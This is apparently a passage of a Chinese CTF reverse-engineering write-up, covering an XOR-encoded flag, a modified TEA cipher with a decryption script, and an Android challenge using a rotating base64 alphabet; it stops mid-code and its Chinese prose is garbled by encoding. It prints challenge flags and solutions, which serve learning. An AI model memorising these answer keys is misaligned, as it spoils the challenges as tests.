<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">32</span>];</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)&amp;c[<span class="number">0</span>] = <span class="number">0x731047656E6F7579</span>LL;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)&amp;c[<span class="number">8</span>] = <span class="number">0x761B45794B10407D</span>LL;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)&amp;c[<span class="number">16</span>] = <span class="number">0x6E005B71491F585F</span>LL;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)&amp;c[<span class="number">24</span>] = <span class="number">0x45045205575D01</span>LL;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> v3 = <span class="number">26</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        c[i] ^= v3++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* cnss&#123;X0R_c4n_b3_us3d_t0_3nc0d3&#125; */</span></span><br></pre></td></tr></table></figure>



<h2 id="ğŸµèŒ¶æ¯å¤´å¤§å†’é™©"><a href="#ğŸµèŒ¶æ¯å¤´å¤§å†’é™©" class="headerlink" title="ğŸµèŒ¶æ¯å¤´å¤§å†’é™©"></a>ğŸµ<strong>èŒ¶æ¯å¤´å¤§å†’é™©</strong></h2><p>çˆ±å…»ç”Ÿçš„Timlzhå¸¦ç€ä»–çš„èŒ¶æ¯å¤´æ¥å‘ä½ æ±‚åŠ©ï¼Œä½ èƒ½å¸®ä»–æ‰¾åˆ°ä»–å¿ƒçˆ±çš„èŒ¶å£¶å—ğŸ˜”</p>
<p>çº¯åŠ å¯†é¢˜ï¼Œæœäº†ä¸€ä¸‹åº”è¯¥æ˜¯å±äºTEAåŠ å¯†ï¼Œé—»æ‰€æœªé—»ï¼Œçœ‹ä¸€ä¸‹ä»£ç é€»è¾‘</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD Str[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  _DWORD v5[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  </span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">429459223</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">537200643</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">537462290</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">537006083</span>;</span><br><span class="line">  </span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">-999025570</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">970203505</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">-181949973</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">-483739382</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">1062983671</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">-697079924</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input the flag: \n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Str) == <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">      <span class="built_in">encrypt</span>(&amp;Str[i], v6);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] != v5[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s not my teapot!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh my god, you made it?!&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the length is NSFW~~~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v5 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 += (((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)) + v5) ^ (a2[v4 &amp; <span class="number">3</span>] + v4);</span><br><span class="line">    v4 += <span class="number">289739793</span>;</span><br><span class="line">    v5 += (((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)) + v6) ^ (a2[(v4 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ å¯†è¿‡ç¨‹a1æ˜¯æ˜æ–‡ï¼Œa2æ˜¯å¯†é’¥ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">const</span> <span class="type">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> delta = <span class="number">0x11451411</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">429459223</span>, <span class="number">537200643</span>, <span class="number">537462290</span>, <span class="number">537006083</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> enc[<span class="number">6</span>] = &#123;<span class="number">0xC474145E</span>, <span class="number">0x39D42171</span>, <span class="number">0xF527A9EB</span>, <span class="number">0xE32AB90A</span>, <span class="number">0x3F5BD7F7</span>, <span class="number">0xD673678C</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">decrypt</span>(&amp;enc[i], key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>, enc[i] &amp; <span class="number">0xFF</span>, (enc[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, (enc[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (enc[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* cnss&#123;Enj0y_te4_W!th_me!&#125; */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ğŸ’¥çˆ†äº†çˆ†äº†ï¼Œå’Œ-JAVA-çˆ†äº†"><a href="#ğŸ’¥çˆ†äº†çˆ†äº†ï¼Œå’Œ-JAVA-çˆ†äº†" class="headerlink" title="ğŸ’¥çˆ†äº†çˆ†äº†ï¼Œå’Œ JAVA çˆ†äº†"></a>ğŸ’¥<strong>çˆ†äº†çˆ†äº†ï¼Œå’Œ JAVA çˆ†äº†</strong></h2><p>å•Šï¼Ÿé€†å‘è¿˜è¦å­¦ Javaï¼Ÿ</p>
<blockquote>
<p>éå¸¸ç®€å•ä¸”å…¥é—¨çš„å®‰å“é€†å‘ ä½ éœ€è¦äº†è§£apkæ–‡ä»¶ç»“æ„ JEBæˆ–JADXçš„ä½¿ç”¨ ä»¥åŠç®€å•çš„javaè¯­æ³•</p>
</blockquote>
<p>JADXæ‰“å¼€ï¼Œç¿»æ‰¾ä¸€é€šï¼Œæ‰¾åˆ°com.cnss.myapplicationï¼Œå°±æ˜¯è¿™é“é¢˜çš„å…³é”®äº†ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">str</span> = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, </span><br><span class="line">                    <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, </span><br><span class="line">                    <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self</span>):</span><br><span class="line">        a = [</span><br><span class="line">            <span class="string">&quot;SJNPhthkmYBHow5Y75wRDa==&quot;</span>,</span><br><span class="line">            <span class="string">&quot;RoBAU/g/jlxuy+Ns1YtA86==&quot;</span>,</span><br><span class="line">            <span class="string">&quot;YZNTjQcHgoBaqf5hyYtM0K==&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Z1Z/gv18ro1pkgF2rX5x+6==&quot;</span>,</span><br><span class="line">            ...<span class="comment">#100ä¸ª</span></span><br><span class="line">            <span class="string">&quot;bXF7hfV5smIOu/1q159Q16==&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c441i+Z6r55Lmf9H4V=XD===&quot;</span>,</span><br><span class="line">            <span class="string">&quot;aY1MmRldcYRrtdlh50RJC===&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Y5dYaAcAjoBtug1NwYFUBa==&quot;</span>,</span><br><span class="line">            <span class="string">&quot;TIk6kw9/pnZ41eRs1IZr4a==&quot;</span>,</span><br><span class="line">            <span class="string">&quot;cIU9ZQpjiINPy/kOw31OEa==&quot;</span></span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            s = <span class="variable language_">self</span>.decode(a[i])</span><br><span class="line">            <span class="built_in">print</span>(a[i])</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, code</span>):</span><br><span class="line">        length = <span class="built_in">len</span>(code)</span><br><span class="line">        <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        end_equal_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> code.endswith(<span class="string">&quot;==&quot;</span>):</span><br><span class="line">            end_equal_num = <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> code.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">            end_equal_num = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        code = code.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        result = []</span><br><span class="line">        block_num = length // <span class="number">4</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(block_num):</span><br><span class="line">            after_decode = <span class="variable language_">self</span>.decode_detail(code[i * <span class="number">4</span>:(i * <span class="number">4</span>) + <span class="number">4</span>])</span><br><span class="line">            <span class="keyword">if</span> after_decode:</span><br><span class="line">                result.append(after_decode)</span><br><span class="line">        </span><br><span class="line">        result_str = <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line">        <span class="keyword">return</span> result_str[:<span class="built_in">len</span>(result_str) - end_equal_num]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_detail</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s) != <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        a1 = <span class="variable language_">self</span>.get_index(s[<span class="number">0</span>])</span><br><span class="line">        <span class="variable language_">self</span>.qwq()</span><br><span class="line">        a2 = <span class="variable language_">self</span>.get_index(s[<span class="number">1</span>])</span><br><span class="line">        <span class="variable language_">self</span>.qwq()</span><br><span class="line">        a3 = <span class="variable language_">self</span>.get_index(s[<span class="number">2</span>])</span><br><span class="line">        <span class="variable language_">self</span>.qwq()</span><br><span class="line">        a4 = <span class="variable language_">self</span>.get_index(s[<span class="number">3</span>])</span><br><span class="line">        <span class="variable language_">self</span>.qwq()</span><br><span class="line">        </span><br><span class="line">        b = [</span><br><span class="line">            <span class="built_in">chr</span>((a1 &lt;&lt; <span class="number">2</span>) | ((a2 &amp; <span class="number">48</span>) &gt;&gt; <span class="number">4</span>)),</span><br><span class="line">            <span class="built_in">chr</span>(((a2 &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>) | ((a3 &amp; <span class="number">60</span>) &gt;&gt; <span class="number">2</span>)),</span><br><span class="line">            <span class="built_in">chr</span>(((a3 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | a4)</span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_index</span>(<span class="params">self, c</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.<span class="built_in">str</span>.index(c)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">qwq</span>(<span class="params">self</span>):</span><br><span class="line">        tmp = [<span class="literal">None</span>] * <span class="number">64</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.<span class="built_in">str</span>)):</span><br><span class="line">            tmp[i] = <span class="variable language_">self</span>.<span class="built_in">str</span>[(i + <span class="number">2</span>) % <span class="number">64</span>]</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">str</span> = tmp.copy()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test = Test()</span><br><span class="line">    test.main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æç¤ºï¼Œkey is a meaningful sentenceï¼Œå†™ä¸ªpythonè„šæœ¬è§£ä¸€ä¸‹base64ï¼Œå¾—åˆ°å¯†é’¥ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(code) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(code) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    end_equal_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> code.endswith(<span class="string">&quot;==&quot;</span>):</span><br><span class="line">        end_equal_num = <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> code.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">        end_equal_num = <span class="number">1</span></span><br><span class="line">    code = code.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    decoded_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">4</span>):</span><br><span class="line">        decoded_str += decode_detail(code[i:i+<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    result = decoded_str[:-end_equal_num]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_detail</span>(<span class="params">encoded_str</span>):</span><br><span class="line">    str_chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    a1 = str_chars.index(encoded_str[<span class="number">0</span>])</span><br><span class="line">    a2 = str_chars.index(encoded_str[<span class="number">1</span>])</span><br><span class="line">    a3 = str_chars.index(encoded_str[<span class="number">2</span>])</span><br><span class="line">    a4 = str_chars.index(encoded_str[<span class="number">3</span>])</span><br><span class="line">    </span><br><span class="line">    b = <span class="built_in">chr</span>(((a1 &lt;&lt; <span class="number">2</span>) | ((a2 &amp; <span 